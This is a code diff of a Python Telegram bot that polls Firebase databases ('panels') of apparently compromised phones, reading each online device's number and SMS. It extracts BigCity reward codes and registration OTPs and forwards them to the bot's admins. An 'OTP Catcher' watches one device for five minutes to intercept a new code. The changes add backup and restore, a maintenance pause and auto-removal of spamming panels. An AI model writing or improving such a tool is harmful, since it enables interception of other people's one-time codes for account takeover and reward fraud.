@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (Strict 7-Digit OTP + Cloud Backup)
+BigCity Firebase Monitor Bot (Manual Backup + Restore + Maintenance)
 """
 import asyncio
 import json
@@ -37,11 +37,10 @@ BASE_DIR = Path(__file__).parent
 STATE_FILE = BASE_DIR / "bot_state.json"
 ADMINS_FILE = BASE_DIR / "admins.json"
 PANELS_FILE = BASE_DIR / "panels.json"
-
-BOT_START_TIME = time.time()
-BASELINE_DELAY = 10
+MAINTENANCE_FILE = BASE_DIR / "maintenance.json"
 
 IS_INITIALIZED = False
+IS_MAINTENANCE = False
 MAX_CONCURRENT = 30
 semaphore = asyncio.Semaphore(MAX_CONCURRENT)
 OTP_WATCH_SECONDS = 300
@@ -49,14 +48,15 @@ API_TIMEOUT = 8
 MONITOR_INTERVAL = 5
 
 active_watches = set()
+panel_spam_tracker = {} 
+process_lock = asyncio.Lock() 
 
-# ─── MESSAGE PATTERNS (Strict 7-digit OTP) ───────────────────────────────────
+# ─── MESSAGE PATTERNS ────────────────────────────────────────────────────────
 REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
-OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{7})", re.IGNORECASE) # <--- STRICT 7 DIGIT
+OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{7})", re.IGNORECASE)
 BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)
-PHONE_PATTERN  = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
 
-# ─── CLOUD DATA MANAGEMENT ───────────────────────────────────────────────────
+# ─── CLOUD & LOCAL DATA MANAGEMENT ───────────────────────────────────────────
 
 def load_json(path, default):
     filename = path.name
@@ -65,42 +65,41 @@ def load_json(path, default):
             r = requests.get(f"{SAVE_URL}/bot_backup/{filename}", timeout=5)
             if r.status_code == 200:
                 data = r.json()
-                if data:
-                    logger.info(f"Loaded {filename} from Cloud.")
-                    return data
-        except Exception as e:
-            logger.debug(f"Cloud load failed for {filename}: {e}")
+                if data is not None: return data
+        except Exception: pass
 
     try:
         if path.exists():
-            with open(path) as f:
-                return json.load(f)
-    except Exception as e:
-        logger.error(f"load {path}: {e}")
+            with open(path) as f: return json.load(f)
+    except Exception: pass
     return default
 
 def save_json(path, data):
     filename = path.name
     if SAVE_URL:
         try:
-            r = requests.put(f"{SAVE_URL}/bot_backup/{filename}", json=data, timeout=10)
-            if r.status_code == 200:
-                logger.info(f"Saved {filename} to Cloud.")
-            else:
-                logger.error(f"Cloud save failed: {r.status_code}")
-        except Exception as e:
-            logger.error(f"Cloud save exception: {e}")
+            requests.put(f"{SAVE_URL}/bot_backup/{filename}", json=data, timeout=10)
+        except Exception: pass
 
     try:
-        with open(path, "w") as f:
-            json.dump(data, f, indent=2)
-    except Exception as e:
-        logger.error(f"save {path}: {e}")
+        with open(path, "w") as f: json.dump(data, f, indent=2)
+    except Exception: pass
 
 def load_panels(): return load_json(PANELS_FILE, {})
 def save_panels(p): save_json(PANELS_FILE, p)
 def load_state(): return load_json(STATE_FILE, {})
 def save_state(s): save_json(STATE_FILE, s)
+
+# ─── MAINTENANCE MODE MANAGER ────────────────────────────────────────────────
+def load_maintenance():
+    global IS_MAINTENANCE
+    data = load_json(MAINTENANCE_FILE, {"status": False})
+    IS_MAINTENANCE = data.get("status", False)
+
+def save_maintenance(status):
+    global IS_MAINTENANCE
+    IS_MAINTENANCE = status
+    save_json(MAINTENANCE_FILE, {"status": status})
 
 # ─── ADMIN MANAGEMENT ────────────────────────────────────────────────────────
 
@@ -117,7 +116,6 @@ def is_admin(cid: int):
     admins = get_admins()
     if not admins:
         save_admins([cid])
-        logger.info(f"New Admin assigned: {cid}")
         return True
     return cid in admins
 
@@ -130,8 +128,7 @@ def parse_firebase_link(link: str):
         if "firebaseio.com" not in host and "firebasedatabase.app" not in host:
             return None
         return f"{p.scheme}://{p.netloc}".rstrip("/")
-    except Exception:
-        return None
+    except Exception: return None
 
 # ─── API HELPERS ─────────────────────────────────────────────────────────────
 
@@ -139,11 +136,9 @@ async def api_get(client, url, timeout=API_TIMEOUT):
     async with semaphore:
         try:
             r = await client.get(url, timeout=timeout)
-            if r.status_code == 200:
-                return r.json(), None
+            if r.status_code == 200: return r.json(), None
             return None, f"HTTP {r.status_code}"
-        except Exception as e:
-            return None, str(e)[:80]
+        except Exception as e: return None, str(e)[:80]
 
 def is_device_id(k: str) -> bool:
     if not isinstance(k, str): return False
@@ -178,14 +173,6 @@ def device_is_online(d: dict) -> bool:
             v = str(d[f]).lower()
             if v in ("true", "online", "1", "yes", "active", "connected"): return True
             if v in ("false", "offline", "0", "no", "inactive"): return False
-    now = time.time() * 1000
-    for f in ("lastSeen", "lastActive", "last_seen", "last_active", "timestamp", "updatedAt", "time"):
-        if f in d:
-            v = d[f]; ts = None
-            if isinstance(v, (int, float)): ts = v if v > 1e12 else v * 1000
-            elif isinstance(v, str) and v.isdigit():
-                n = int(v); ts = n if n > 1e12 else n * 1000
-            if ts and (now - ts) < 10 * 60 * 1000: return True
     return False
 
 def clean_number(val: str) -> str:
@@ -200,53 +187,18 @@ def clean_number(val: str) -> str:
 
 def _extract_number(d: dict) -> str:
     if not isinstance(d, dict): return ""
-    for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile"):
+    for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile", "Phone #1", "Phone #2"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
-    for f in ("Phone #1", "Phone_1", "phone1", "Phone #2", "Phone_2", "phone2", "sim_number"):
-        if f in d and d[f]:
-            cleaned = clean_number(d[f])
-            if cleaned: return cleaned
-    for k, v in d.items():
-        if isinstance(v, dict):
-            res = _extract_number(v)
-            if res: return res
     return ""
 
-def extract_number_from_msg_text(text: str) -> str:
-    if not text: return ""
-    match = PHONE_PATTERN.search(text)
-    if match: return clean_number(match.group(1))
-    return ""
-
-# ─── TIME PARSER (AM/PM FIX) ─────────────────────────────────────────────────
-def get_msg_timestamp(md: dict) -> float:
-    dt_str = md.get("dateTime", md.get("time", md.get("timestamp", "")))
-    if not dt_str: return 0.0
-
-    if isinstance(dt_str, (int, float)):
-        return (dt_str / 1000.0) if dt_str > 1e12 else float(dt_str)
-
-    dt_str = str(dt_str).strip()
-    match = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2}\s*[apAP][mM])', dt_str)
-    if match:
-        try:
-            date_part = match.group(1)
-            time_part = match.group(2).lower()
-            dt = datetime.strptime(f"{date_part} {time_part}", "%d-%m-%Y %I:%M %p")
-            return dt.timestamp()
-        except Exception: pass
-
-    match2 = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2})', dt_str)
-    if match2:
-        try:
-            date_part = match2.group(1)
-            time_part = match2.group(2)
-            dt = datetime.strptime(f"{date_part} {time_part}", "%d-%m-%Y %H:%M")
-            return dt.timestamp()
-        except Exception: pass
-    return 0.0
+def extract_sender_time(md: dict):
+    dt = md.get("dateTime", md.get("time", md.get("timestamp","")))
+    if isinstance(dt, (int, float)):
+        try: dt = datetime.fromtimestamp(dt/1000 if dt>1e12 else dt).strftime("%d-%m-%Y | %I:%M %p")
+        except Exception: dt = str(dt)
+    return str(dt)
 
 async def fetch_online_devices(client, base, dev_node):
     path = f"/{dev_node}" if dev_node else ""
@@ -255,7 +207,7 @@ async def fetch_online_devices(client, base, dev_node):
     out = []
     for did, dd in data.items():
         if not is_device_id(did) or not isinstance(dd, dict) or not device_is_online(dd): continue
-        num = _extract_number(dd)
+        num = _extract_number(dd) 
         out.append((did, num))
     return out
 
@@ -273,44 +225,88 @@ def classify_bigcity(text: str):
     if m: return "otp", m.group(1)
     return None, None
 
-def extract_sender_time(md: dict):
-    sender = "Unknown"
-    for f in ("sender","from","address","number","fromNumber"):
-        if f in md and md[f]: sender = str(md[f]); break
-    dt = md.get("dateTime", md.get("time", md.get("timestamp","")))
-    if isinstance(dt, (int, float)):
-        try: dt = datetime.fromtimestamp(dt/1000 if dt>1e12 else dt).strftime("%Y-%m-%d %H:%M:%S")
-        except Exception: dt = str(dt)
-    return sender, str(dt)
-
 def extract_text(md: dict):
     for f in ("message","body","text","msg","SMS","content"):
         if f in md and md[f]: return str(md[f])
     return ""
 
-# ─── PREMIUM FORMATTERS ──────────────────────────────────────────────────────
+# ─── PREMIUM SHORT FORMATTERS ────────────────────────────────────────────────
 
-def fmt_reward(panel, did, num, sender, dt, code, msg, token):
-    btn = InlineKeyboardMarkup([[InlineKeyboardButton("🎯 OTP Catcher (5 min)", callback_data=f"otp|{token}")]])
+def fmt_reward(panel, did, num, dt, code, token):
+    btn = InlineKeyboardMarkup([[InlineKeyboardButton("🎯 OTP Catcher", callback_data=f"otp|{token}")]])
     txt = (
-        "🎉 <b>BIGCITY REWARD CODE FOUND</b> 🎉\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 <b>Panel:</b> {panel}\n📲 <b>Device:</b> <code>{did}</code>\n"
-        f"🔢 <b>Number:</b> <code>{num or 'N/A'}</code>\n📨 <b>Sender:</b> {sender}\n"
-        f"⏰ <b>Time:</b> {dt}\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎁 <b>REWARD CODE (Tap to copy):</b>\n👉 <code>{code}</code> 👈\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n📄 <i>{msg}</i>"
+        "🎁 <b>𝐁𝐈𝐆𝐂𝐈𝐓𝐘 𝐑𝐄𝐖𝐀𝐑𝐃</b> 🎁\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"📱 <b>𝐏𝐚𝐧𝐞𝐥:</b> {panel}\n"
+        f"📲 <b>𝐃𝐞𝐯𝐢𝐜𝐞:</b> <code>{did}</code>\n"
+        f"🔢 <b>𝐍𝐮𝐦𝐛𝐞𝐫:</b> <code>{num or 'N/A'}</code>\n"
+        f"⏰ <b>𝐓𝐢𝐦𝐞:</b> {dt}\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"🎟 <b>𝐂𝐨𝐝𝐞:</b> <code>{code}</code>"
     )
     return txt, btn
 
-def fmt_otp(panel, did, num, sender, dt, otp, msg):
+def fmt_otp(panel, did, num, dt, otp):
     return (
-        "🔐 <b>BIGCITY OTP RECEIVED</b> 🔐\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 <b>Panel:</b> {panel}\n📲 <b>Device:</b> <code>{did}</code>\n"
-        f"🔢 <b>Number:</b> <code>{num or 'N/A'}</code>\n📨 <b>Sender:</b> {sender}\n"
-        f"⏰ <b>Time:</b> {dt}\n━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔑 <b>OTP CODE (Tap to copy):</b>\n👉 <code>{otp}</code> 👈\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n📄 <i>{msg}</i>"
+        "🔐 <b>𝐁𝐈𝐆𝐂𝐈𝐓𝐘 𝐎𝐓𝐏</b> 🔐\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"📱 <b>𝐏𝐚𝐧𝐞𝐥:</b> {panel}\n"
+        f"📲 <b>𝐃𝐞𝐯𝐢𝐜𝐞:</b> <code>{did}</code>\n"
+        f"🔢 <b>𝐍𝐮𝐦𝐛𝐞𝐫:</b> <code>{num or 'N/A'}</code>\n"
+        f"⏰ <b>𝐓𝐢𝐦𝐞:</b> {dt}\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"🔑 <b>𝐎𝐓𝐏:</b> <code>{otp}</code>"
     )
+
+# ─── MANUAL BACKUP & RESTORE ─────────────────────────────────────────────────
+
+async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    panels = load_panels()
+    admins = get_admins()
+    state = load_state()
+    
+    backup_data = {
+        "panels": panels,
+        "admins": admins,
+        "state": state
+    }
+    
+    backup_str = json.dumps(backup_data, indent=2)
+    
+    with open("backup.txt", "w") as f:
+        f.write(backup_str)
+        
+    await update.message.reply_text("📦 <b>Backup Ready!</b>\nYeh file save kar lo, aage deploy ke baad restore karne ke liye.", parse_mode="HTML")
+    await update.message.reply_document(document=open("backup.txt", "rb"), filename="bot_backup.txt")
+
+async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    await update.message.reply_text("📂 <b>Restore:</b> Kripya apni backup.txt file bhejein (attach as document).", parse_mode="HTML")
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    doc = update.message.document
+    if not doc.file_name.endswith(".txt") and not doc.file_name.endswith(".json"):
+        return await update.message.reply_text("❌ Sirf .txt ya .json file allowed hai.")
+    
+    file = await doc.get_file()
+    await file.download_to_drive("restore_temp.txt")
+    
+    try:
+        with open("restore_temp.txt", "r") as f:
+            data = json.load(f)
+            
+        if "panels" in data:
+            save_panels(data["panels"])
+        if "admins" in data:
+            save_admins(data["admins"])
+        if "state" in data:
+            save_state(data["state"])
+            
+        await update.message.reply_text("✅ <b>Restore Successful!</b>\nSaara data wapas aa gaya.", parse_mode="HTML")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Restore failed: {str(e)}")
 
 # ─── MONITORING ──────────────────────────────────────────────────────────────
 
@@ -329,16 +325,7 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             key = f"{pk}:{did}:{mid}"
             
             if state.get(key): continue
-            
-            init_key = f"init:{pk}"
-            if not state.get(init_key):
-                state[key] = True; continue
-            
-            if (time.time() - BOT_START_TIME) < BASELINE_DELAY or not IS_INITIALIZED:
-                state[key] = True; continue
-            
-            msg_time = get_msg_timestamp(md)
-            if msg_time > 0 and msg_time < BOT_START_TIME:
+            if not IS_INITIALIZED:
                 state[key] = True; continue
             
             text = extract_text(md)
@@ -348,16 +335,32 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             if not kind:
                 state[key] = True; continue
                 
-            sender, dt = extract_sender_time(md)
-            # Use device number only — never extract from SMS text (wrong number risk)
-            actual_num = num  # Empty string → fmt shows N/A
-
-            if kind == "reward":
-                token = f"{pk}~{did}~{int(time.time())}"
-                txt, btn = fmt_reward(panel, did, actual_num, sender, dt, payload, text, token)
+            now = time.time()
+            if pk not in panel_spam_tracker:
+                panel_spam_tracker[pk] = []
+            panel_spam_tracker[pk] = [t for t in panel_spam_tracker[pk] if now - t < 10]
+            
+            if len(panel_spam_tracker[pk]) >= 15:
+                logger.warning(f"BOMBER DETECTED ON PANEL {pk}. REMOVING PANEL.")
+                panels = load_panels()
+                if pk in panels:
+                    del panels[pk]
+                    save_panels(panels)
                 for uid in admins:
                     try:
-                        await asyncio.wait_for(app.bot.send_message(chat_id=uid, text=txt, parse_mode="HTML", reply_markup=btn, disable_web_page_preview=True), timeout=10)
+                        await app.bot.send_message(chat_id=uid, text=f"🚨 <b>PANEL AUTO-REMOVED!</b>\n\nPanel: <b>{panel}</b>\nReason: <b>Heavy Spamming</b>", parse_mode="HTML")
+                    except Exception: pass
+                return sent
+
+            panel_spam_tracker[pk].append(now)
+            dt = extract_sender_time(md)
+            
+            if kind == "reward":
+                token = f"{pk}~{did}~{int(time.time())}"
+                txt, btn = fmt_reward(panel, did, num, dt, payload, token)
+                for uid in admins:
+                    try:
+                        await app.bot.send_message(chat_id=uid, text=txt, parse_mode="HTML", reply_markup=btn, disable_web_page_preview=True)
                     except Exception: pass
                 sent += 1
             state[key] = True
@@ -366,57 +369,92 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
 
 async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
     global IS_INITIALIZED
+    if IS_MAINTENANCE: return
+
     app = context.application
     try:
         admins = get_admins()
         if not admins: return
-        panels = load_panels()
-        state = load_state()
-        
-        total = 0
-        async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
-            for pk, pc in list(panels.items()):
-                base = pc.get("base")
-                if not base: continue
-                init_key = f"init:{pk}"
-                
-                try:
-                    if pc.get("device_node") is None or pc.get("message_node") is None:
-                        dn, mn = await asyncio.wait_for(discover_structure(client, base), timeout=20)
-                        if dn is None: continue
-                        pc["device_node"] = dn; pc["message_node"] = mn
-                        save_panels(panels)
-                    
-                    online = await asyncio.wait_for(fetch_online_devices(client, base, pc.get("device_node","")), timeout=25)
-                    if not online: continue
-                    
-                    if not state.get(init_key):
-                        for did, _ in online:
-                            try: 
-                                msgs = await asyncio.wait_for(fetch_last_messages(client, base, pc.get("message_node",""), did, limit=15), timeout=15)
-                                for mk, md in msgs.items():
-                                    if isinstance(md, dict): 
-                                        state[f"{pk}:{did}:{str(md.get('id', mk))}"] = True
-                            except Exception: pass
-                        state[init_key] = True
-                        save_state(state)
-                        logger.info(f"Panel {pk} baseline done.")
-                        continue
-                    
-                    tasks = [process_device(client, pk, pc, did, num, state, admins, app) for did, num in online]
-                    results = await asyncio.gather(*tasks, return_exceptions=True)
-                    for r in results:
-                        if isinstance(r, int): total += r
-                except Exception: pass
-                
-        if not IS_INITIALIZED and (time.time() - BOT_START_TIME) >= BASELINE_DELAY:
-            IS_INITIALIZED = True
-            save_state(state)
-            logger.info("Initial scan complete. Ab bot active hai.")
-        elif total > 0:
-            save_state(state)
+
+        async with process_lock: 
+            panels = load_panels()
+            state = load_state()
             
+            total = 0
+            async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
+                for pk, pc in list(panels.items()):
+                    base = pc.get("base")
+                    if not base: continue
+                    init_key = f"init:{pk}"
+                    
+                    try:
+                        if pc.get("device_node") is None or pc.get("message_node") is None:
+                            dn, mn = await asyncio.wait_for(discover_structure(client, base), timeout=20)
+                            if dn is None: continue
+                            pc["device_node"] = dn; pc["message_node"] = mn
+                            save_panels(panels)
+                        
+                        online = await asyncio.wait_for(fetch_online_devices(client, base, pc.get("device_node","")), timeout=25)
+                        if not online: continue
+                        
+                        if not state.get(init_key):
+                            for did, _ in online:
+                                try: 
+                                    msgs = await asyncio.wait_for(fetch_last_messages(client, base, pc.get("message_node",""), did, limit=15), timeout=15)
+                                    for mk, md in msgs.items():
+                                        if isinstance(md, dict): 
+                                            state[f"{pk}:{did}:{str(md.get('id', mk))}"] = True
+                                except Exception: pass
+                            state[init_key] = True
+                            save_state(state)
+                            continue
+                        
+                        tasks = [process_device(client, pk, pc, did, num, state, admins, app) for did, num in online]
+                        results = await asyncio.gather(*tasks, return_exceptions=True)
+                        for r in results:
+                            if isinstance(r, int): total += r
+                    except Exception: pass
+                    
+            if not IS_INITIALIZED:
+                IS_INITIALIZED = True
+                save_state(state)
+                logger.info("STRICT INITIAL SCAN COMPLETE. BOT IS NOW ACTIVE.")
+            elif total > 0:
+                save_state(state)
+                
     except Exception as e: logger.error(f"monitor outer: {e}")
+
+# ─── MAINTENANCE COMMANDS ────────────────────────────────────────────────────
+
+async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    
+    status = "🔴 PAUSED (Maintenance)" if IS_MAINTENANCE else "🟢 ACTIVE"
+    out = (
+        f"🛠 <b>Maintenance Mode</b>\n━━━━━━━━━━━━━━━━━━\n"
+        f"Current Status: {status}\n\n"
+        "Agar aap Pause karenge toh bot scanning rok dega aur naye messages nahi aayenge.\n"
+        "Resume karne par wapas chalu ho jayega."
+    )
+    
+    btn_pause = InlineKeyboardButton("⏸ Pause", callback_data="maint_pause")
+    btn_resume = InlineKeyboardButton("▶️ Resume", callback_data="maint_resume")
+    
+    kb = InlineKeyboardMarkup([[btn_pause, btn_resume]])
+    await update.message.reply_text(out, parse_mode="HTML", reply_markup=kb)
+
+async def maintenance_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if not is_admin(q.from_user.id): return await q.answer("❌ Admin Only!", show_alert=True)
+    
+    if q.data == "maint_pause":
+        save_maintenance(True)
+        await q.answer("Bot Paused (Maintenance Mode ON)", show_alert=True)
+        await q.edit_message_text("🛠 <b>Maintenance Mode</b>\n\nStatus: 🔴 <b>PAUSED</b>\n\nBot ab scan nahi karega.", parse_mode="HTML")
+    elif q.data == "maint_resume":
+        save_maintenance(False)
+        await q.answer("Bot Resumed (Maintenance Mode OFF)", show_alert=True)
+        await q.edit_message_text("🛠 <b>Maintenance Mode</b>\n\nStatus: 🟢 <b>ACTIVE</b>\n\nBot wapas scan kar raha hai.", parse_mode="HTML")
 
 # ─── OTP CATCHER ─────────────────────────────────────────────────────────────
 
@@ -485,9 +523,8 @@ async def otp_watch(app, chat_id, pk, did):
                         text = extract_text(md)
                         kind, payload = classify_bigcity(text)
                         if kind != "otp": continue
-                        sender, dt = extract_sender_time(md)
-                        actual_num = dev_num  # Use device number only — never extract from SMS text
-                        await app.bot.send_message(chat_id, fmt_otp(panel, did, actual_num, sender, dt, payload, text), parse_mode="HTML", disable_web_page_preview=True)
+                        dt = extract_sender_time(md)
+                        await app.bot.send_message(chat_id, fmt_otp(panel, did, dev_num, dt, payload), parse_mode="HTML", disable_web_page_preview=True)
                         try: await watch_msg.edit_reply_markup(reply_markup=None)
                         except Exception: pass
                         await app.bot.send_message(chat_id, f"✅ <b>OTP aaya — watch band</b> (<code>{did}</code>).", parse_mode="HTML")
@@ -513,8 +550,13 @@ async def otp_watch(app, chat_id, pk, did):
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cid = update.effective_chat.id
     if not is_admin(cid): return await update.message.reply_text("❌ Aap Admin nahi hain.")
-    kb = ReplyKeyboardMarkup([["📊 Status","📋 My Panels"],["➕ Add Panel","❌ Remove Panel"],["👑 Admin Panel"]], resize_keyboard=True)
-    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Super Fast (5s Scan)\n• Sirf NAYE messages\n• Number from Device Data\n• 🎯 OTP Catcher (5 min)\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
+    kb = ReplyKeyboardMarkup([
+        ["📊 Status","📋 My Panels"],
+        ["➕ Add Panel","❌ Remove Panel"],
+        ["👑 Admin Panel","🛠 Maintenance"],
+        ["📦 Backup", "📂 Restore"]
+    ], resize_keyboard=True)
+    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Strict Scan\n• Short Msg\n• 🛠 Maintenance Mode\n• 📦 Backup/Restore\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
 
 async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_chat.id): return
@@ -629,18 +671,30 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def main():
     if not BOT_TOKEN: logger.error("BOT_TOKEN missing!"); sys.exit(1)
+    
+    load_maintenance()
+
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("addadmin", add_admin_command))
     app.add_handler(CommandHandler("deladmin", del_admin_command))
     app.add_handler(CommandHandler("removeall", remove_all_command))
+    app.add_handler(CommandHandler("backup", backup_command))
+    app.add_handler(CommandHandler("restore", restore_command))
+    
+    app.add_handler(MessageHandler(filters.Regex(r"^(📦 Backup|Backup)$"), backup_command))
+    app.add_handler(MessageHandler(filters.Regex(r"^(📂 Restore|Restore)$"), restore_command))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+
     app.add_handler(MessageHandler(filters.Regex(r"^(📊 Status|Status)$"), status_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(📋 My Panels|My Panels)$"), my_panels_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(➕ Add Panel|Add Panel)$"), add_panel_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(❌ Remove Panel|Remove Panel)$"), remove_panel_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(👑 Admin Panel|Admin Panel)$"), admin_panel_command))
+    app.add_handler(MessageHandler(filters.Regex(r"^(🛠 Maintenance|Maintenance)$"), maintenance_command))
     
+    app.add_handler(CallbackQueryHandler(maintenance_cb, pattern=r"^maint_"))
     app.add_handler(CallbackQueryHandler(otp_catcher_cb, pattern=r"^otp\|"))
     app.add_handler(CallbackQueryHandler(stop_otp_watch_cb, pattern=r"^stop_otp\|"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
